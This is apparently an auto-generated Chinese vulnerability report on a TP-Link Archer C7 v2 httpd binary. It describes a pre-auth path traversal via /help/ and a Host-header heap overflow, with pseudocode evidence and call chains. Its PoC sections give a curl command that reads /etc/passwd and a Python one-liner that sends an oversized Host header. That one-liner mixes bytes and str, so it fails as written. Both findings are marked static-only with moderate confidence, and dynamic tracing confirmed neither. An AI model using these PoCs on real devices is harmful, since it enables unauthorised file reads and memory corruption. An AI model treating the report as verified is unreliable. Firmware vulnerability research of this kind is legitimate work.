# 漏洞挖掘报告

> 会话 `s-mv0o98ol-47f9` · 固件任务 `60ca28d897cf` · 2026-10-09T08:54:26Z

## 一、任务信息

| 项 | 内容 |
| --- | --- |
| 任务目标 | 对 httpd 预认证攻击面做一轮实战挖掘：优先命令注入与缓冲区溢出，读伪代码定位，动态验证（trace/qemu_exec），成立的按规范入库 record_finding，最后输出中文总结。 |
| 引擎 | dsh（模式：dynamic） |
| 轮次 | 3 / 82 |

## 二、发现统计

| 危害等级 | 数量 |
| --- | --- |
| **高危** | 2 |
| 合计 | 2 |

### 危害等级分布

```
  高危　 │██████████████████████████  2
```

### 可达性分布

```
  static-only │██████████████████████████  2
```

### 高频目标二进制 Top8

```
  httpd　　　　　　　　　　　　　　　│██████████████████████████  2
```

## 三、动态验证

- 摘录最近 1 条 trace，其中非空差分 0 条。

| Trace | 状态 | 入口 | 差分函数 | 备注 |
| --- | --- | --- | --- | --- |
| `acf370244f7d` | ok_empty_diff | `net:80` | 0 | - |

## 四、漏洞详情

### 漏洞 1：httpd 预认证路径穿越任意文件读取（/help/ URL 经 httpRpmFsA 无 ".." 检查直读）（`F-mv0orz1g-ebb8`）

| 字段 | 内容 |
| --- | --- |
| 漏洞类型 | 路径穿越 `CWE-22` |
| 危害等级 | **高危**（置信度 0.68） |
| 影响组件 | `firmware/binwalk_extracted/firmware.extracted/0/squashfs-root/usr/bin/httpd` |
| 二进制指纹 | `9582aa23b0bc2de099b9997b09457d01` |
| 漏洞位置 | `httpRpmFsA` @ `0x426524` |
| 可达性 | static-only |

**漏洞描述**：TP-Link Archer C7 v2 httpd 预认证任意文件读取。免鉴权的 /help/ 处理器 httpHelpRequestRpm 将原始 URL 直接传入 httpRpmFsA，后者先拼 "/tmp/"+URL 并 open，该分支缺少 httpRpmFs 同款 strstr("..") 路径穿越检查，穿越成功即把任意文件内容回发给攻击者。可读取 /tmp 配置导出、账户/密钥材料，为后续认证绕过提供信息基础。

**漏洞证据**：

1. httpRpmFsA(0x426524) 伪代码：strcpy(v4,"/tmp/"); strcat(v4,a2); v5=open(v4,0); if(v5>=0) goto LABEL_7 —— /tmp 分支 open 前没有任何 ".." 检查，文件内容随后经 stat/read/httpBlockPut 回发给请求方
2. 对照 httpRpmFs(0x426880) 同一分支：strcat 后立即 v4=strstr(v2,"..")!=0 并拒绝 —— 两函数实现不一致证明 httpRpmFsA 属实现缺陷而非设计
3. webHelpPageRpmInit(0x489060)：httpRpmConfAdd(2, "/help/", httpHelpRequestRpm) —— /help/ 前缀绑定该免鉴权 handler
4. httpDispatcher(0x425d08) 汇编/伪代码 0x425f6c-0x425f84：v6==httpRpmFs 或 v6==httpHelpRequestRpm 时直接跳过 sub_425CB8 认证执行 handler
5. httpHelpRequestRpm(0x489084)：httpRpmFsA(a1, *(a1+20)) —— a1+20 即原始请求 URL，攻击者完全控制
6. httpd(0x45cbc0)：httpAliasConfAdd("/help/*","/help/*") 原样透传，URL 前缀 /help/ 即可命中
7. fw_read_bytes 0x5B6E10 白名单表(off_5B6E10)仅约束 httpRpmFs，httpRpmFsA 无此白名单逻辑

**调用链**：

```
TCP:80 → mud 接收 → httpDispatcher(0x425d08) → httpHelpRequestRpm(0x489084) → httpRpmFsA(0x426524) → strcpy(v4,"/tmp/")+strcat(v4,URL) → open(v4,0) 无 ".." 检查 → stat/read → httpBlockPut 响应客户端
```

**漏洞 PoC**：

```
原始 socket 或 curl 禁止路径规范化：curl --path-as-is http://<router>/help/../../etc/passwd ；URL 解析为 /tmp//help/../../etc/passwd = /etc/passwd，响应体即文件内容。同理可读 /tmp/ 下配置导出、任意系统文件。
```


### 漏洞 2：httpd 预认证 Host 头堆溢出（LoginRpmHtm→getWholeHostAddr 无界 sprintf 进 0x800 堆块）（`F-mv0orz6r-fca8`）

| 字段 | 内容 |
| --- | --- |
| 漏洞类型 | 堆缓冲区溢出 `CWE-120` |
| 危害等级 | **高危**（置信度 0.6） |
| 影响组件 | `firmware/binwalk_extracted/firmware.extracted/0/squashfs-root/usr/bin/httpd` |
| 二进制指纹 | `9582aa23b0bc2de099b9997b09457d01` |
| 漏洞位置 | `getWholeHostAddr` @ `0x45a744` |
| 可达性 | static-only |

**漏洞描述**：TP-Link Archer C7 v2 httpd 预认证堆缓冲区溢出。任意未认证请求认证失败后进入 LoginRpmHtm，getWholeHostAddr 把攻击者可控的 Host 头原样 sprintf("http://%s") 写入 malloc(0x800) 的 2048 字节堆缓冲。WAN 侧访问时 Host 值不经任何替换直通该拷贝，mud 层 128KB 接收池允许 Host 超长，可造成堆越界写，进一步可发展为远程代码执行或拒绝服务。

**漏洞证据**：

1. LoginRpmHtm(0x45c4c4) 伪代码：v4=malloc(0x800u); memset(v4,0,0x800u); getWholeHostAddr(a1,v4) —— 2048 字节堆块
2. getWholeHostAddr(0x45a744) 伪代码：HttpIsAccessFromLAN(a1) 为假时 v6=v4(Host 原文，仅剥离首个冒号)，末尾 sprintf(a2,"http://%s",v6) 无长度约束
3. HttpIsAccessFromLAN(0x45a6a0)：httpClientIPGet→inet_addr→swChkSameLanSubnet，客户端 IP 不在 LAN 子网即返回 0 → WAN 侧 Host 原文直通
4. httpMimeHost(0x448590)：Host 值经 httpMimeHostSet/httpSetEnv 动态存储，无截断
5. mudCreate(0x44278c)/httpServerCreate(0x42de50)：每连接 0x20000 字节 memPool —— 请求头行可携带远超 2048 字节的 Host 值
6. 认证失败路径：httpDispatcher 中 sub_425CB8 返回非 0 即调用 LoginRpmHtm，无需有效凭据即可到达

**调用链**：

```
TCP:80 Host 头 → httpMimeHost(0x448590) → httpSetEnv("HOST") → httpDispatcher(0x425d08) → sub_425CB8(0x425cb8) 认证失败 → LoginRpmHtm(0x45c4c4) → malloc(0x800) → getWholeHostAddr(0x45a744) → HttpIsAccessFromLAN(0x45a6a0)==false → v6=Host 原文 → sprintf(a2,"http://%s",v6) 堆溢出
```

**漏洞 PoC**：

```
python3 -c "import socket;s=socket.create_connection(('192.168.0.1',80));s.send(b'GET /userRpm/Index.htm HTTP/1.1\\r\\nHost: '+'A'*4000+b'\\r\\n\\r\\n');print(s.recv(4096))" —— 以无效/缺失凭据发起请求触发登录页，WAN 侧来源下 Host 原文被 sprintf 进 2048 字节堆块造成越界写。
```

